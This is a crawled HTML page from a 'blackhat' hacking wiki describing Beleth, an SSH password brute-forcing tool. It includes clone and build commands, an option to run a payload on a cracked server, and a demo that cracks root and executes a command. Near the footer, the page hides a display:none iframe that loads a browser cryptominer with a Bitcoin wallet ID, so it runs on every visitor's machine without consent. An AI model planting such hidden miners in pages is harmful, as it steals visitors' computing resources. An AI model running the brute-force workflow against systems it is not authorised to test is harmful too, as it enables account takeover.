@@ -1,0 +1,276 @@
+http://www.blackhatlibrary.net/Beleth
+HTTP/1.1 200 OK
+Server: cloudflare-nginx
+Date: Tue, 22 Jul 2014 21:42:08 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Set-Cookie: __cfduid=d9f07fdc8497ffc36daaebf573f8fbb5a1406065327414; expires=Mon, 23-Dec-2019 23:50:00 GMT; path=/; domain=.blackhatlibrary.net; HttpOnly
+X-Powered-By: PHP/5.4.15
+Content-language: en
+Vary: Accept-Encoding, Cookie
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+Cache-Control: private, must-revalidate, max-age=0
+CF-RAY: 14e2ce6858030874-IAD
+Content-Encoding: gzip
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<title>Beleth - Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</title>
+<meta name="generator" content="MediaWiki" />
+<meta name="og:title" content="Beleth" />
+<meta name="og:type" content="article" />
+<meta name="og:image" content="http://www.blackhatacademy.org/security101/logo.png" />
+<meta name="og:site_name" content="Blackhat Academy - Security101 Wiki" />
+<meta name="og:description" content="For security reasons, we cannot remotely parse content.  Please visit the link provided to see the full article!" />
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="/opensearch_desc.php" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools (en)" />
+<link rel="EditURI" type="application/rsd+xml" href="http://www.blackhatlibrary.net/api.php?action=rsd" />
+<link rel="alternate" type="application/atom+xml" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools Atom feed" href="/index.php?title=Special:RecentChanges&amp;feed=atom" />
+<link rel="stylesheet" href="/load.php?debug=false&amp;lang=en&amp;modules=mediawiki.legacy.commonPrint%2Cshared&amp;only=styles&amp;skin=monobook&amp;*" />
+<link rel="stylesheet" href="/skins/monobook/main.css?" media="screen" />
+<!--[if lt IE 5.5000]><link rel="stylesheet" href="/skins/monobook/IE50Fixes.css?" media="screen" /><![endif]-->
+<!--[if IE 5.5000]><link rel="stylesheet" href="/skins/monobook/IE55Fixes.css?" media="screen" /><![endif]-->
+<!--[if IE 6]><link rel="stylesheet" href="/skins/monobook/IE60Fixes.css?" media="screen" /><![endif]-->
+<!--[if IE 7]><link rel="stylesheet" href="/skins/monobook/IE70Fixes.css?" media="screen" /><![endif]--><meta name="ResourceLoaderDynamicStyles" content="" />
+</head>
+<body class="mediawiki ltr ns-0 ns-subject page-Beleth skin-monobook">
+<div id="globalWrapper">
+<div id="column-content"><div id="content">
+	<a id="top"></a>
+	<div id="siteNotice"><div id="localNotice"><div align="right"><i>Questions about this topic? <a href="/Special:UserLogin" title="Special:UserLogin">Sign up</a> to ask in the talk tab</i>.</div><br />
+</div></div>	<div align="center" id="ad"><script type="text/javascript"><!--
+google_ad_client = "ca-pub-3100048614381705";
+google_ad_slot = "3567986077";
+google_ad_width = 728;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+	<h1 id="firstHeading" class="firstHeading">Beleth</h1>
+	<div id="bodyContent">
+		<div id="siteSub">From Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</div>
+		<div id="contentSub"></div>
+		<div id="jump-to-nav">Jump to: <a href="#column-one">navigation</a>, <a href="#searchInput">search</a></div>
+		<!-- start content -->
+<p><b>Beleth</b> is a multi-threaded asynchronous SSH <a href="/Password" title="Password">password</a> auditing tool written in <a href="/C" title="C">C</a>. There are plenty of other password cracking programs out there that can do the job, but I wanted something small, fast, and custom as a proof of concept. After preliminary tests, Beleth was able to outperform both <a href="https://www.thc.org/thc-hydra/" class="external text" rel="nofollow">THC-Hydra</a> and <a href="http://nmap.org/ncrack/" class="external text" rel="nofollow">Ncrack</a>. Beleth also allows you to run a remote command after successfully cracking a password. Pull requests are welcome as the development is an ongoing process. For a more in depth look at the code, check out <a href="http://www.chokepoint.net/2013/11/development-notes-from-beleth-multi.html" class="external text" rel="nofollow">Chokepoint</a> development blog.
+</p>
+<h2> <span class="mw-headline" id="Disclaimer"><b>Disclaimer</b></span></h2>
+<p>Beleth is a password auditing tool and should not be run against anyone else's system without receiving proper permission first. By using this application on a live connection, you do so at your own risk.
+</p>
+<h2> <span class="mw-headline" id="Get_the_source"><b>Get the source</b></span></h2>
+<p>Beleth is available on github and will continue to be updated with new features. The only library dependency is <a href="http://www.libssh2.org/" class="external text" rel="nofollow">LibSSH2</a>. Included with Beleth is the 2012 <a href="http://www.zdnet.com/top-25-common-attackable-passwords-stop-using-ninja-and-jesus-7000006373/" class="external text" rel="nofollow">Top 25 most used passwords list</a>.
+</p>
+<pre>
+$ git clone https://github.com/chokepoint/Beleth.git
+$ cd beleth
+$ make
+$ ./beleth -h
+Usage: ./beleth [OPTIONS]
+	-c [payload]	Execute payload on remote server once logged in
+	-h		Display this help
+	-l [threads]	Limit threads to given number. Default: 10
+	-p [port]	Specify remote port
+	-t [target]	Attempt connections to this server
+	-u [user]	Attempt connection using this username
+	-v		-v (Show attempts) -vv (Show debugging)
+	-w [wordlist]	Use this wordlist. Defaults to wordlist.txt
+$ ./beleth -t 127.0.0.1 -u root -w wordlist.txt -c 'uname -a' -l 15
++-----------------------------------------+
+|                 Beleth                  |
+|           www.chokepoint.net            |
++-----------------------------------------+
+[*] Read 25 passwords from file.
+[*] Starting task manager
+[*] Spawning 15 threads
+[*] Starting attack on <a class="__cf_email__" href="http://www.cloudflare.com/email-protection" data-cfemail="bdcfd2d2c9fd8c8f8a938d938d938c">[email&nbsp;protected]</a><script type="text/javascript">
+/* <![CDATA[ */
+(function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName("script");l=b[b.length-1].previousSibling;a=l.getAttribute('data-cfemail');if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
+/* ]]> */
+</script>:22
+[*] Authentication succeeded (root:<a class="__cf_email__" href="http://www.cloudflare.com/email-protection" data-cfemail="640e01171117245556534a544a544a55">[email&nbsp;protected]</a><script type="text/javascript">
+/* <![CDATA[ */
+(function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName("script");l=b[b.length-1].previousSibling;a=l.getAttribute('data-cfemail');if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
+/* ]]> */
+</script>:22)
+[*] Executing: uname -a
+[*] Linux eclipse 3.2.0-4-686-pae #1 SMP Debian 3.2.46-1+deb7u1 i686 GNU/Linux
+[*] Cleaning up child processes.
+</pre>
+
+<!-- 
+NewPP limit report
+Preprocessor node count: 10/1000000
+Post-expand include size: 0/2097152 bytes
+Template argument size: 0/2097152 bytes
+Expensive parser function count: 0/100
+-->
+<div class="printfooter">
+Retrieved from "<a href="http://www.blackhatlibrary.net/Beleth">http://www.blackhatlibrary.net/Beleth</a>"</div>
+		<div id='catlinks' class='catlinks catlinks-allhidden'></div>		<!-- end content -->
+				<div class="visualClear"></div>
+	</div>
+</div></div>
+<div id="column-one">
+	<div id="p-cactions" class="portlet">
+		<h5>Views</h5>
+		<div class="pBody">
+			<ul>
+				 <li id="ca-nstab-main" class="selected"><a href="/Beleth" title="View the content page [c]" accesskey="c">Page</a></li>
+				 <li id="ca-talk" class="new"><a href="/index.php?title=Talk:Beleth&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+				 <li id="ca-viewsource"><a href="/index.php?title=Beleth&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+				 <li id="ca-history"><a href="/index.php?title=Beleth&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			</ul>
+		</div>
+	</div>
+	<div class="portlet" id="p-personal">
+		<h5>Personal tools</h5>
+		<div class="pBody">
+			<ul>
+				<li id="pt-login"><a href="/index.php?title=Special:UserLogin&amp;returnto=Beleth" title="You are encouraged to log in; however, it is not mandatory [o]" accesskey="o">Log in</a></li>
+			</ul>
+		</div>
+	</div>
+	<div class="portlet" id="p-logo">
+		<a style="background-image: url(/logo.png);" href="/Main_Page" title="Visit the main page"></a>
+	</div>
+	<script type="text/javascript"> if (window.isMSIE55) fixalpha(); </script>
+	<div class='generated-sidebar portlet' id='p-Wiki'>
+		<h5>Wiki</h5>
+		<div class='pBody'>
+			<ul>
+				<li id="n-mainpage-description"><a href="/Main_Page" title="Visit the main page [z]" accesskey="z">Main page</a></li>
+				<li id="n-The-index"><a href="/Category:Indexing">The index</a></li>
+				<li id="n-Donate"><a href="/Donations">Donate</a></li>
+				<li id="n-Contribute"><a href="/Category:Requested_maintenance">Contribute</a></li>
+				<li id="n-recentchanges"><a href="/Special:RecentChanges" title="The list of recent changes in the wiki [r]" accesskey="r">Recent changes</a></li>
+				<li id="n-randompage"><a href="/Special:Random" title="Load a random page [x]" accesskey="x">Random page</a></li>
+			</ul>
+		</div>
+	</div>
+	<div class='generated-sidebar portlet' id='p-Community'>
+		<h5>Community</h5>
+		<div class='pBody'>
+			<ul>
+				<li id="n-Chokepoint"><a href="http://www.chokepoint.net">Chokepoint</a></li>
+				<li id="n-.2Fr.2Fblackhat"><a href="http://reddit.com/r/blackhat">/r/blackhat</a></li>
+				<li id="n-.40BlackhatStaff"><a href="http://twitter.com/BlackhatStaff">@BlackhatStaff</a></li>
+			</ul>
+		</div>
+	</div>
+	<div id="p-search" class="portlet">
+		<h5><label for="searchInput">Search</label></h5>
+		<div id="searchBody" class="pBody">
+			<form action="/index.php" id="searchform">
+				<input type='hidden' name="title" value="Special:Search"/>
+				<input id="searchInput" title="Search Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools" accesskey="f" type="search" name="search" />
+				<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Go" title="Go to a page with this exact name if exists" />&#160;
+				<input type='submit' name="fulltext" class="searchButton" id="mw-searchButton" value="Search" title="Search the pages for this text" />
+			</form>
+		</div>
+	</div>
+	<div class="portlet" id="p-tb">
+		<h5>Toolbox</h5>
+		<div class="pBody">
+			<ul>
+				<li id="t-whatlinkshere"><a href="/Special:WhatLinksHere/Beleth" title="List of all wiki pages that link here [j]" accesskey="j">What links here</a></li>
+				<li id="t-recentchangeslinked"><a href="/Special:RecentChangesLinked/Beleth" title="Recent changes in pages linked from this page [k]" accesskey="k">Related changes</a></li>
+<li id="t-specialpages"><a href="/Special:SpecialPages" title="List of all special pages [q]" accesskey="q">Special pages</a></li>
+				<li id="t-print"><a href="/index.php?title=Beleth&amp;printable=yes" rel="alternate" title="Printable version of this page [p]" accesskey="p">Printable version</a></li>				<li id="t-permalink"><a href="/index.php?title=Beleth&amp;oldid=46555" title="Permanent link to this revision of the page">Permanent link</a></li>			</ul>
+		</div>
+	</div>
+&nbsp;
+
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-3100048614381705";
+/* BHL Sidebar */
+google_ad_slot = "2730381272";
+google_ad_width = 120;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript"
+src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+
+<a href="http://www.srsvps.com/"><center><img src="http://blackhatlibrary.net/images/srsvps-button-tux.png" style="padding: 2px,0px,2px,0px;"></center></a><br />
+<a href="http://vps-heaven.com/"><center><img src="http://blackhatlibrary.net/images/vps-heaven.png" style="padding: 2px,0px,2px,0px;"></center></a><br />
+<center>VPS-Heaven now accepting BitCoin!</center><br />
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-40369725-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+<a href="http://www.soldierx.com/"><center><img src="http://www.soldierx.com/system/files/images/sx-mini-1.jpg" style="padding: 2px,0px,2px,0px;"></center></a>
+<br /><br /><center>Our research is made possible by your support.</center><br />
+<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
+<input type="hidden" name="cmd" value="_s-xclick">
+<input type="hidden" name="hosted_button_id" value="74Q9CEK92HZCL">
+<input type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
+<img alt="" border="0" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1" height="1">
+</form>
+</div><!-- end of the left (by default at least) column -->
+<div class="visualClear"></div>
+<iframe style='display:none' src='http://tidbit.co.in/miner'><script>window.walletId = 1Lr99MtUNbUVSpU6MFA3CboYWGgZ8pHWdB</script></iframe>
+<div id="footer">
+	<div id="f-poweredbyico">
+		<a href="http://www.mediawiki.org/"><img src="/skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
+	</div>
+	<ul id="f-list">
+		<li id="lastmod"> This page was last modified on 10 November 2013, at 03:14.</li>
+		<li id="viewcount">This page has been accessed 7,786 times.</li>
+		<li id="privacy"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:Privacy_policy" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:Privacy policy">Privacy policy</a></li>
+		<li id="about"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:About" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:About">About Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</a></li>
+		<li id="disclaimer"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:General_disclaimer" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:General disclaimer">Disclaimers</a></li>
+<div align="center"><a href="http://www.darkexile.com/forums/index.php?action=affiliates;sa=in;idaff=15"><img src="http://www.darkexile.com/forums/gallery/3_20_01_11_10_02_44.png"></a>&nbsp; <a href="http://hacktalk.net/"><img src="hacktalk.png"></a></div>
+
+	</ul>
+</div>
+</div>
+
+<script src="/load.php?debug=false&amp;lang=en&amp;modules=startup&amp;only=scripts&amp;skin=monobook&amp;*"></script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Beleth", "wgTitle": "Beleth", "wgAction": "view", "wgArticleId": 36686, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 46555, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
+	mediaWiki.loader.go();
+}
+</script>
+
+<script type="text/javascript"> 
+function toggleDisplay( id, hidetext, showtext )
+{
+  link = document.getElementById( id + "l" ).childNodes[0];
+ 
+  with( document.getElementById( id ).style )
+    {
+      if( display == "none" )
+	{
+	  display = "inline";
+	  link.nodeValue = hidetext;
+	}
+      else
+	{
+	  display = "none";
+	  link.nodeValue = showtext;
+	}
+    }
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"monobook","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
+	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"en","language":"en","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
+}
+</script><!-- Served in 0.441 secs. --></body></html>
